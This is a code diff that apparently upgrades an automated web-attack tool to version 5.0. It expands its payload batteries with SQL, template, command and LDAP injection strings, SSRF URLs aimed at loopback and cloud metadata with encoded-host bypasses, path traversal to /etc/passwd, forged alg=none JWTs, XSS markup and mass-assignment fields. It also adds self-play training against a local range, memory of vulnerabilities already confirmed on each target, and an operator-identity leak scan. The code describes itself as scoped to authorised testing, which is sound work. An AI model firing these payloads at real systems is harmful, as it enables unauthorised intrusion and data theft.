@@ -96,7 +96,7 @@ from pathlib import Path
 sys.path.insert(0, str(Path(__file__).resolve().parent))
 import scope_authority as sa  # noqa: E402
 
-VERSION = "4.0.0"
+VERSION = "5.0.0"
 SCHEMA = 4
 
 
@@ -594,7 +594,8 @@ def cmd_verify(args):
                  "doctor", "bench", "fleet", "arsenal", "mission", "phases",
                  "ledger", "gate", "chain", "context", "testers", "coverage",
                  "report", "relay", "campaign", "mandates", "next", "selftest",
-                 "crawl", "takeover", "version"):
+                 "crawl", "takeover", "capabilities", "protect", "train",
+                 "memory", "version"):
         if want not in help_out:
             bad.append(f"subcommand {want}")
     mandate = self.parent.parent / "references" / "mandate.md"
@@ -608,8 +609,8 @@ def cmd_verify(args):
         bad.append("phases != 13")
     if len(CHAIN_PATTERNS) < 8:
         bad.append("chain patterns")
-    if len(TESTERS) != 8:
-        bad.append("testers != 8")
+    if len(TESTERS) != 11:
+        bad.append("testers != 11")
     # docs must carry the same version as the code
     for doc in ("README.md", "SKILL.md", "CHANGELOG.md"):
         p = self.parent.parent / doc
@@ -1788,14 +1789,25 @@ def _planner_directive(target, url=None, domain=None):
                  "no access-control findings yet — 8 differential testers, one pass",
                  "0-8 ledger rows (deduped, evidence-gated)",
                  ["in-scope only", "documented-PoC payloads"])
-    # 6. targeted class holes → a focused gate run each
-    for cls, probe_q, token in (("AUTHN", "token=", None), ("BIZLOGIC", "amount=-1", None),
-                                ("SSRF", "url=http://127.0.0.1:9/", None)):
+    # 6. targeted class holes → focused gate runs, ORDERED BY LEARNED PRIORS
+    #    (train writes hit rates; the planner shoots the highest-yield class first —
+    #    estate memory re-ranks when this estate confirmed a class before)
+    emem = _estate_memory(target)
+    past = set(emem.get("classes", []))
+    hole_classes = [("AUTHN", "token="), ("BIZLOGIC", "amount=-1"),
+                    ("SSRF", "url=http://127.0.0.1:9/")]
+    if url and "IDOR" not in classes:
+        hole_classes.insert(0, ("IDOR", "org_id=foreign"))
+    for cls, probe_q in _prior_order([c for c, _ in hole_classes]):
+        probe_q = next(q for c, q in hole_classes if c == cls)
         if url and cls not in classes and f"gate-{cls}" not in done_ids:
+            why = f"ledger hole: no {cls}-class finding — a focused 3-gate run"
+            if cls in past:
+                why += f" (estate memory: {cls} confirmed here before — priority)"
             return d(f"gate-{cls}", "input_validation", "spy", "gate",
                      ["gate", "--target", target, "--url", url,
                       "--attack-query", probe_q, "--append-query"],
-                     f"ledger hole: no {cls}-class finding — a focused 3-gate run",
+                     why,
                      "CONFIRMED / HYPOTHESIS / or DISPROVEN (all are results)",
                      ["in-scope only", "validation-only"])
     # 7. chains — findings combine into kill chains
@@ -1957,8 +1969,9 @@ def cmd_loop(args):
     for step in range(1, args.max_steps + 1):
         dv = _planner_directive(args.target, url=url, domain=domain)
         if dv is None:
-            print(f"═══ LOOP COMPLETE — {step - 1} step(s) executed · "
+            print(f"═══ LOOP COMPLETE — {step - 1} step(s) · "
                   f"{total_findings} finding(s) · mission done ═══")
+            _estate_write_from_ledger(args.target)
             return KERNEL_EXIT["complete"]
         argv_str = " ".join(dv["argv"])
         print(f"\n▸ step {step}: [{dv['phase']}] {dv['directive_id']} — {argv_str[:90]}")
@@ -3154,6 +3167,18 @@ def cmd_gate(args):
         if ":" in h:
             k, v = h.split(":", 1)
             hb[k.strip()] = v.strip()
+    # v5 gate v2 — cookie differentials and JSON-body differentials:
+    # --cookie rides both requests; --json-body makes the baseline a JSON POST
+    # and --attack-body swaps the attack's body entirely (the classic
+    # mass-assignment / role-flip / price-tamper proof shape)
+    if getattr(args, "cookie", None):
+        hb["Cookie"] = args.cookie
+    if getattr(args, "json_body", None):
+        method = "POST"
+        hb["Content-Type"] = "application/json"
+        args.data = args.json_body
+        if getattr(args, "attack_body", None) and not getattr(args, "attack_data", None):
+            args.attack_data = args.attack_body
     reps = max(1, int(getattr(args, "reps", 1) or 1))
     baselines = []
     for _ in range(reps):
@@ -3570,39 +3595,76 @@ def _t_requests_removed():  # removed — differential requests are built in run
 TESTERS = [
     {"name": "IDOR", "cls": "IDOR",
      "params": ("id", "org_id", "user_id", "account_id", "order_id", "doc_id"),
-     "attacks": lambda v: ["foreign", f"{v}+1"] if v else [],
+     "attacks": lambda v: ["foreign", f"{v}+1", "0", "-1", f"{v}-1", "999999"] if v else [],
      "logic": "object identifier trusted from the request — swap it, diff the body"},
     {"name": "AUTHZ", "cls": "AUTHZ",
      "params": ("role", "admin", "is_admin", "level"),
-     "attacks": lambda v: ["admin", "1", "0"] if v else [],
+     "attacks": lambda v: ["admin", "1", "0", "true", "superuser", "root"] if v else [],
      "logic": "role/level param trusted from input — flip it, diff the body"},
     {"name": "MASSASSIGN", "cls": "MASSASSIGN",
      "params": ("email", "name", "price", "qty", "amount"),
      "attacks": lambda v: [v] if v else [],
-     "extra": "&role=admin&is_admin=1&price=0&balance=999999",
+     "extra": "&role=admin&is_admin=1&price=0&balance=999999&admin=true&isAdmin=1&user_type=admin&privilege=9",
      "logic": "unexpected writable fields accepted in the request body (POST only)"},
     {"name": "INJECTION", "cls": "INJECTION",
      "params": ("q", "search", "name", "filter", "sort", "msg", "comment"),
-     "attacks": lambda v: [f"{v}'", "{{7*7}}", "${7*7}"] if v else [],
-     "signatures": ("sql", "syntax error", "odbc", "mysql", "sqlite", "49"),
+     "attacks": lambda v: ([f"{v}'", f'{v}"', f"{v}' OR '1'='1", "1' AND '1'='2",
+                            "`", "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}",
+                            "{{7*'7'}}", f"{v};id", f"{v}$(id)", f"{v}`id`",
+                            "*(| (uid=*))"] if v else []),
+     "signatures": ("sql", "syntax error", "odbc", "mysql", "sqlite", "psql",
+                    "ora-", "uid=", "49", "warning:", "unterminated", "pg_"),
      "logic": "input reaches an interpreter — quote/markers reflected or evaluated"},
     {"name": "AUTHN", "cls": "AUTHN",
      "params": ("token", "otp", "code", "password", "nonce"),
-     "attacks": lambda v: ["", "null", "0"] if v else [],
+     "attacks": lambda v: ["", "null", "0", "000000", "123456", "undefined",
+                           "none", "false"],
      "logic": "credential param accepted empty/forged — auth bypass class"},
     {"name": "BIZLOGIC", "cls": "BIZLOGIC",
      "params": ("qty", "amount", "price", "count", "discount", "qty"),
-     "attacks": lambda v: ["-1", "0", "99999999"] if v else [],
+     "attacks": lambda v: ["-1", "0", "99999999", "0.0001", "1e309", "-0.0001"] if v else [],
      "logic": "quantity/amount accepted out of business range — negative/overflow class"},
     {"name": "SSRF", "cls": "SSRF",
      "params": ("url", "uri", "fetch", "target", "src", "redirect", "next"),
-     "attacks": lambda v: ["http://127.0.0.1:9/", "http://169.254.169.254/latest/meta-data/"] if v else [],
-     "logic": "user-controlled URL fetched server-side — internal/metadata reach"},
+     "attacks": lambda v: (["http://127.0.0.1:9/", "http://localhost:9/",
+                            "http://169.254.169.254/latest/meta-data/",
+                            "http://[::1]:9/", "http://0x7f000001:9/",
+                            "http://2130706433:9/", "http://127.1:9/"] if v else []),
+     "logic": "user-controlled URL fetched server-side — internal/metadata reach "
+              "(loopback · link-local · dword/hex/decimal-host encodings)"},
     {"name": "FILEATTACK", "cls": "TRAVERSAL",
-     "params": ("path", "file", "page", "template", "include", "lang"),
-     "attacks": lambda v: ["../../etc/passwd", "....//etc/passwd"] if v else [],
+     "params": ("path", "file", "page", "template", "include", "lang",
+                "name", "filename", "download", "read", "doc"),
+     "attacks": lambda v: (["../../etc/passwd", "....//etc/passwd",
+                            "..%2f..%2fetc%2fpasswd", "%2e%2e%2fetc%2fpasswd",
+                            "..\\..\\etc\\passwd", "/etc/passwd",
+                            "....\\....\\etc\\passwd",
+                            "%uff0e%uff0e%uff0fetc%uff0fpasswd"] if v else []),
      "signatures": ("root:x:0:0", "root:*:0:0", "daemon:"),
-     "logic": "path param never normalized — traversal escapes the web root"},
+     "logic": "path param never normalized — traversal escapes the web root "
+              "(dot-dot · encoded · double-encoded · backslash · absolute · unicode)"},
+    {"name": "JWT", "cls": "JWT",
+     "params": ("token", "jwt", "auth", "id_token", "access_token"),
+     "attacks": lambda v: (["eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ.",
+                            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4ifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
+                            ""] if v is not None else []),
+     "signatures": ("admin", "true"),
+     "logic": "token claims trusted without signature verification — alg=none / "
+              "confused-deputy / empty-signature forgery class"},
+    {"name": "XSS", "cls": "XSS",
+     "params": ("q", "search", "name", "comment", "msg", "term"),
+     "attacks": lambda v: (["spy<svg/onload=x>", '"><svg/onload=x>',
+                            "<img src=x onerror=spy1>", "'-spy<svg>-'",
+                            "<iframe src=spy>"] if v else []),
+     "signatures": ("<svg", "<img", "<iframe", "onload=", "onerror="),
+     "logic": "input reflected without context-encoding — markup reaches the "
+              "response body (reflection proof; execution is the browser's call)"},
+    {"name": "SESSION", "cls": "SESSION",
+     "params": ("sid", "sessionid", "session", "sess", "phpsessid", "jsessionid"),
+     "attacks": lambda v: ([f"{v}1", "0", "1", "-1", f"{v}00"] if v else []),
+     "signatures": ("admin", "role", "true"),
+     "logic": "session identifier structure trusted — sequential/weak ids "
+              "enumerated (CWE-384 class)"},
 ]
 
 
@@ -3870,7 +3932,311 @@ def _is_ip(host):
         return False
 
 
-# ── v4.1 THE SURFACE ENGINE — the kernel discovers its own attack surface ─────
+# ════════════════════════════════════════════════════════════════════════════
+# v5.0 — SELF-KNOWLEDGE · SELF-PROTECTION · GROWTH
+# ════════════════════════════════════════════════════════════════════════════
+
+MEM_ROOT = Path.home() / ".redteam" / "memory"
+
+
+def cmd_capabilities(args):
+    """THE MIRROR OF SELF — what this machine can do, introspected LIVE from the
+    engines (never a doc): engines × presence, confirmable classes, tools,
+    kernel directives, corpus, phases. The planner and any agent ground on this."""
+    import importlib.util
+    payload = {"version": VERSION, "schema": SCHEMA}
+    payload["engines"] = {name: {"present": p.exists(), "role": role}
+                          for name, (p, role) in FAMILY.items()}
+    payload["confirmable_classes"] = sorted(
+        {t["cls"] for t in TESTERS}
+        | {p["name"] for p in CHAIN_PATTERNS}
+        | set(CLASS_BINDINGS))
+    payload["tester_battery"] = {t["name"]: len(t["attacks"]("x") or ["+extra-fields"])
+                                 for t in TESTERS}
+    payload["takeover_services"] = [s["service"] for s in TAKEOVER_SIGS]
+    payload["phases"] = [p["id"] for p in PHASES]
+    payload["kernel_directives"] = [
+        "scope-init", "barbican-posture", "holy-recon", "undercroft-run",
+        "crawl-surface", "testers-run", "gate-AUTHN", "gate-BIZLOGIC",
+        "gate-SSRF", "chain-detect", "kage-mirror", "shukaku-ingest",
+        "war-report"]
+    # the execution layer: arsenal's live inventory (the real tools on THIS machine)
+    try:
+        spec = importlib.util.spec_from_file_location(
+            "arsenal", str(Path(__file__).resolve().parent / "arsenal.py"))
+        ar = importlib.util.module_from_spec(spec)
+        spec.loader.exec_module(ar)
+        inv = ar.installed()
+        payload["executors"] = {"total": len(ar.ARSENAL),
+                                "installed": sorted(inv),
+                                "installed_count": len(inv),
+                                "chains": sorted(ar.CHAINS)}
+    except Exception as e:
+        payload["executors"] = {"error": str(e)[:120]}
+    # the corpus
+    exp_idx = Path(__file__).resolve().parent.parent / "references" / "skilltree-expanded-index.md"
+    if exp_idx.exists():
+        payload["corpus"] = sum(1 for l in exp_idx.read_text(errors="replace").splitlines()
+                                if l.startswith("- ["))
+    payload["priors"] = _priors()
+    if _json_mode(args):
+        _emit(args, payload)
+        return 0
+    print(f"═══ SPYDERMONKEY CAPABILITIES (introspected, live) ═══")
+    print(f"  engines: {sum(1 for e in payload['engines'].values() if e['present'])}"
+          f"/10 on disk · confirmable classes: {len(payload['confirmable_classes'])}")
+    print(f"  tester batteries: " + ", ".join(f"{k}={v}" for k, v in
+                                               payload["tester_battery"].items()))
+    print(f"  executors: {payload['executors'].get('installed_count', 0)}/"
+          f"{payload['executors'].get('total', '?')} installed · "
+          f"chains: {', '.join(payload['executors'].get('chains', []))}")
+    print(f"  takeover fingerprints: {len(payload['takeover_services'])} · "
+          f"corpus: {payload.get('corpus', 0)} skill files")
+    print(f"  learned priors: " + (", ".join(
+        f"{c}={d['hits']}/{d['runs']}" for c, d in payload["priors"].items())
+        or "untrained — run: spydermonkey train"))
+    return 0
+
+
+def _priors():
+    """Learned per-class hit rates from self-play (train) — the planner orders
+    probes by what WORKS. Missing file = untrained."""
+    try:
+        return _load_json(MEM_ROOT / "spydermonkey-priors.json", {})
+    except Exception:
+        return {}
+
+
+def _prior_order(cls_list):
+    """Order classes by prior hit-rate (desc), untrained classes in the middle."""
+    pr = _priors()
+    def rate(c):
+        d = pr.get(c)
+        if not d or not d.get("runs"):
+            return 0.5          # unknown — middle
+        return d["hits"] / d["runs"]
+    return sorted(cls_list, key=lambda c: -rate(c))
+
+
+def _estate_memory(target):
+    try:
+        return _load_json(MEM_ROOT / "estates" / f"{target}.json", {})
+    except Exception:
+        return {}
+
+
+def _estate_save(target, mem):
+    d = MEM_ROOT / "estates"
+    d.mkdir(parents=True, exist_ok=True)
+    (d / f"{target}.json").write_text(json.dumps(mem, indent=2) + "\n")
+
+
+def cmd_memory(args):
+    """ESTATE MEMORY — what the family already knows about a target: every
+    confirmed class, the dates, the chain candidates, the findings count. The
+    planner reads this before it plans."""
+    mem = _estate_memory(args.target)
+    if args.forget:
+        p = MEM_ROOT / "estates" / f"{args.target}.json"
+        if p.exists():
+            p.unlink()
+            print(f"▸ estate memory wiped: {args.target}")
+        return 0
+    if not mem:
+        print(f"· no estate memory for '{args.target}' — first contact (train/loop builds it)")
+        return 0
+    if _json_mode(args):
+        _emit(args, mem)
+        return 0
+    print(f"═══ ESTATE MEMORY — {args.target} ═══")
+    for row in mem.get("history", [])[-10:]:
+        print(f"  {row['at'][:10]}  {row['kind']:10s} confirmed={row.get('confirmed', [])}")
+    print(f"  known classes: {', '.join(mem.get('classes', [])) or '—'}")
+    return 0
+
+
+def cmd_train(args):
+    """SELF-PLAY TRAINING — the family attacks ITS OWN range (dojo replicas) and
+    measures per-class hit rates; the priors file feeds the planner (probe
+    ordering) forever. This is how spydermonkey gets better every run."""
+    import importlib.util
+    dojo = Path.home() / ".hermes/skills/security/dojo/scripts/dojo.py"
+    repo_dojo = Path(__file__).resolve().parent.parent.parent.parent / "dojo/scripts/dojo.py"
+    dojo = dojo if dojo.exists() else repo_dojo
+    if not dojo.exists():
+        print("✗ dojo engine not on disk — training needs the range", file=sys.stderr)
+        return 1
+    spec = importlib.util.spec_from_file_location("dojo_mod", str(dojo))
+    dj = importlib.util.module_from_spec(spec)
+    spec.loader.exec_module(dj)
+    classes = list(dj.CLASSES)
+    if args.classes:
+        classes = [c for c in classes if c.upper() in
+                   {x.strip().upper() for x in args.classes.split(",")}]
+    pr = _priors()
+    port = args.port
+    rows = []
+    print(f"═══ SPYDERMONKEY TRAINING — {len(classes)} class(es) × self-play ═══")
+    for cls in classes:
+        spec_c = dj.CLASSES[cls]
+        probe = spec_c["probe"]
+        if probe.startswith("POST "):
+            continue  # body classes train via the ledger benches, not query testers
+        port += 1
+        srv = dj._serve(cls, port)
+        base_url = f"http://127.0.0.1:{port}"
+        probe_path = probe.split(" ")[0]
+        rows_before = {r["id"] for r in _ledger_load(args.target)}
+        if "?" in probe_path:
+            # differential class: the testers strike the probe's own param
+            _selfplay_strike(args.target, base_url + probe_path)
+            got = {r["cls"] for r in _ledger_load(args.target)
+                   if r["status"] == "CONFIRMED" and r["id"] not in rows_before}
+        else:
+            # fingerprint class (HARVEST/DIRECTORY/CRYPTO/NETWORK/REPLAY):
+            # no params — the family's proof is the probe + confirm-string
+            ok = dj._strike(base_url + probe_path, spec_c["confirm"])
+            got = {cls} if ok else set()
+        srv.shutdown()
+        hit = 1 if got else 0
+        d = pr.setdefault(cls, {"hits": 0, "runs": 0})
+        d["hits"] += hit
+        d["runs"] += 1
+        rows.append((cls, hit, sorted(got)))
+        print(f"  {'✓' if hit else '✗'} {cls:10s} → testers confirmed: "
+              f"{', '.join(sorted(got)) or 'nothing'}")
+    MEM_ROOT.mkdir(parents=True, exist_ok=True)
+    (MEM_ROOT / "spydermonkey-priors.json").write_text(
+        json.dumps(pr, indent=2) + "\n")
+    hits = sum(h for _, h, _ in rows)
+    print(f"═══ training pass: {hits}/{len(rows)} class(es) confirmed by the testers "
+          f"· priors written ({MEM_ROOT / 'spydermonkey-priors.json'}) ═══")
+    print("  the planner now orders probes by what works — the family gets sharper every run")
+    return 0
+
+
+def _selfplay_strike(target, url):
+    """Run the differential testers against one replica probe (in-process)."""
+    args = type("A", (), {"target": target, "url": [url], "demo": False,
+                          "json": True, "timeout": 6})()
+    return cmd_testers(args)
+
+
+def _estate_write_from_ledger(target):
+    """The growth loop's write side: every completed engagement updates the
+    estate memory — confirmed classes, counts, dates. The next campaign on this
+    target plans with it."""
+    mem = _estate_memory(target)
+    rows = _ledger_load(target)
+    confirmed = sorted({r["cls"] for r in rows if r.get("status") == "CONFIRMED"})
+    mem.setdefault("classes", [])
+    for c in confirmed:
+        if c not in mem["classes"]:
+            mem["classes"].append(c)
+    mem.setdefault("history", []).append(
+        {"at": _now(), "kind": "engagement", "confirmed": confirmed,
+         "findings": len(rows)})
+    _estate_save(target, mem)
+    return confirmed
+
+
+def cmd_protect(args):
+    """SELF-PROTECTION — the family guards the OPERATOR: scans every campaign
+    artifact for operator-identifying strings (whoami · hostname · LAN IPs ·
+    git email · home paths), verifies wipes, and emits the kage-style detection
+    rule for every leak class found. The mirror turned on ourselves."""
+    import getpass
+    import socket as sk
+    if args.action == "posture":
+        ident = {
+            "user": getpass.getuser(),
+            "hostname": sk.gethostname(),
+            "home": str(Path.home()),
+            "emails": [],
+            "ips": [],
+        }
+        gitcfg = Path.home() / ".gitconfig"
+        if gitcfg.exists():
+            ident["emails"] = re.findall(r"email\s*=\s*(\S+@\S+)",
+                                         gitcfg.read_text(errors="replace"))
+        try:
+            r = subprocess.run(["hostname", "-I"], capture_output=True, text=True, timeout=5)
+            ident["ips"] = [ip for ip in r.stdout.split() if _is_ip(ip)]
+        except Exception:
+            pass
+        if _json_mode(args):
+            _emit(args, ident)
+            return 0
+        print("═══ OPERATOR POSTURE (what this machine can leak) ═══")
+        print(f"  user: {ident['user']} · host: {ident['hostname']}")
+        print(f"  home: {ident['home']}")
+        print(f"  git emails: {', '.join(ident['emails']) or '—'}")
+        print(f"  LAN IPs: {', '.join(ident['ips'][:6]) or '—'}")
+        print("  (protect scan --all-campaigns finds every one of these in the artifacts)")
+        return 0
+    camp_root = Path.home() / ".redteam" / "campaigns"
+    targets = ([args.target] if args.target and not args.all_campaigns
+               else [d.name for d in camp_root.iterdir() if d.is_dir()]
+               if camp_root.exists() else [])
+    ident = {"user": getpass.getuser(), "hostname": sk.gethostname(),
+             "home": str(Path.home())}
+    gitcfg = Path.home() / ".gitconfig"
+    if gitcfg.exists():
+        ident["emails"] = re.findall(r"email\s*=\s*(\S+@\S+)",
+                                     gitcfg.read_text(errors="replace"))
+    else:
+        ident["emails"] = []
+    try:
+        r = subprocess.run(["hostname", "-I"], capture_output=True, text=True, timeout=5)
+        ident["ips"] = [ip for ip in r.stdout.split() if _is_ip(ip)]
+    except Exception:
+        ident["ips"] = []
+    needles = ([ident["user"], ident["hostname"], ident["home"]]
+               + ident.get("emails", []) + ident.get("ips", []))
+    leaks = []
+    scanned = 0
+    for t in targets:
+        cdir = camp_root / t
+        for f in cdir.rglob("*"):
+            if not f.is_file() or f.suffix not in (".md", ".json", ".jsonl", ".txt"):
+                continue
+            try:
+                text = f.read_text(errors="replace")
+            except Exception:
+                continue
+            scanned += 1
+            for n in needles:
+                if n and n in text:
+                    leaks.append({"campaign": t, "file": f.name,
+                                  "kind": ("git-email" if "@" in n else
+                                           "lan-ip" if _is_ip(n) else
+                                           "home-path" if n == ident["home"] else
+                                           "identity"),
+                                  "string": n[:20]})
+    st = {"scanned_files": scanned, "leaks": leaks, "at": _now()}
+    outdir = camp_root / (args.target or "protect")
+    outdir.mkdir(parents=True, exist_ok=True)
+    (outdir / "protect-state.json").write_text(json.dumps(st, indent=2) + "\n")
+    if _json_mode(args):
+        _emit(args, st)
+        return 0 if not leaks else 1
+    print(f"═══ SELF-PROTECTION SCAN — {scanned} artifact(s) across {len(targets)} campaign(s) ═══")
+    by_kind = {}
+    for l in leaks:
+        by_kind[l["kind"]] = by_kind.get(l["kind"], 0) + 1
+        print(f"  ⚠ {l['campaign']}/{l['file']}: {l['kind']} leak ({l['string']}…)")
+    print(f"═══ {len(leaks)} operator-string leak(s) "
+          f"({', '.join(f'{k}={v}' for k, v in by_kind.items()) or 'clean'}) ═══")
+    if leaks:
+        print("  ▸ kage rule for the leak class: artifact hygiene — strip operator strings")
+        print("    (barbican sanitize owns the strip; protect PROVES it's clean)")
+        return 1
+    print("  ✓ operator-identifying strings: ZERO in the family's artifacts")
+    return 0
+
+
+# ════════════════════════════════════════════════════════════════════════════
+# v4.1 THE SURFACE ENGINE — the kernel discovers its own attack surface ───────
 
 _JS_PATH_RE = re.compile(
     r"""(?:fetch\(|axios[.(]|url\s*[:=]\s*|api\s*[:=]\s*)["'`](/[a-zA-Z0-9_\-./]{2,60})["'`]""")
@@ -4075,6 +4441,14 @@ def cmd_testers(args):
                     stable = (b1["status"], b1["sha256"]) == (b2["status"], b2["sha256"])
                     if not stable:
                         decisive, reason = False, "unstable baseline across control repeats"
+                    elif not hit and t["name"] in ("SSRF", "REDIRECT"):
+                        # a redirect-class finding can live in the Location header
+                        # alone (302 with a swapped target) — body-diff misses it
+                        bl = (b1.get("headers") or {}).get("location", "")
+                        al = (a.get("headers") or {}).get("location", "")
+                        if bl and al and bl != al:
+                            hit, decisive, reason = True, True, \
+                                f"302 Location swapped: {bl[:30]} → {al[:40]}"
                     if hit:
                         hits.append({"param": p, "original": orig, "payload": atk,
                                      "baseline": _gate_brief(b1),
@@ -4791,7 +5165,7 @@ def _run_selftest(quick: bool = False) -> dict:
         if not quick:
             json_run("testers demo",
                      ["testers", "--target", "selftest", "--demo"],
-                     lambda p: len(p.get("testers", [])) == 8 and p.get("confirmed", 0) >= 1,
+                     lambda p: len(p.get("testers", [])) == 11 and p.get("confirmed", 0) >= 1,
                      timeout=60)
             json_run("chain detect",
                      ["chain", "detect", "--target", "selftest"],
@@ -5037,6 +5411,9 @@ def _build_parser() -> argparse.ArgumentParser:
     gt.add_argument("--data", help="POST body")
     gt.add_argument("--attack-data", dest="attack_data", help="separate body for the attack request")
     gt.add_argument("--header", action="append", help="'Name: value' (repeatable)")
+    gt.add_argument("--json-body", help="POST a JSON body as the BASELINE (gate v2: body differentials)")
+    gt.add_argument("--attack-body", help="the JSON body for the ATTACK request (with --json-body)")
+    gt.add_argument("--cookie", help="'k=v' — sent as Cookie on both requests")
     gt.add_argument("--confirm", help="token that must appear in the attack body for CONFIRMED")
     gt.add_argument("--expect-regex", dest="expect_regex",
                     help="regex that must match the attack body")
@@ -5082,6 +5459,18 @@ def _build_parser() -> argparse.ArgumentParser:
     tk.add_argument("--target", required=True)
     tk.add_argument("--domain", required=True)
     tk.add_argument("--subdomains", help="file of subdomains (else the finder state + the domain)")
+    cp = sub.add_parser("capabilities", help="THE MIRROR OF SELF: live-introspected capability registry")
+    pt = sub.add_parser("protect", help="SELF-PROTECTION: operator posture · artifact leak scan · wipe proof")
+    pt.add_argument("action", choices=("posture", "scan"))
+    pt.add_argument("--target", help="one campaign (or --all-campaigns)")
+    pt.add_argument("--all-campaigns", dest="all_campaigns", action="store_true")
+    tr = sub.add_parser("train", help="SELF-PLAY: attack the dojo range, learn per-class hit rates (priors)")
+    tr.add_argument("--target", default="training")
+    tr.add_argument("--classes", help="comma list (default: every dojo class)")
+    tr.add_argument("--port", type=int, default=8850)
+    mm = sub.add_parser("memory", help="ESTATE MEMORY: what the family knows about a target")
+    mm.add_argument("--target", required=True)
+    mm.add_argument("--forget", action="store_true")
 
     ts = sub.add_parser("testers", help="8 parallel sub-testers over the session context")
     ts.add_argument("--target", required=True)
@@ -5231,6 +5620,14 @@ def _dispatch(a) -> int:
         return cmd_crawl(a)
     if a.cmd == "takeover":
         return cmd_takeover(a)
+    if a.cmd == "capabilities":
+        return cmd_capabilities(a)
+    if a.cmd == "protect":
+        return cmd_protect(a)
+    if a.cmd == "train":
+        return cmd_train(a)
+    if a.cmd == "memory":
+        return cmd_memory(a)
     if a.cmd == "coverage":
         return cmd_coverage(a)
     if a.cmd == "report":
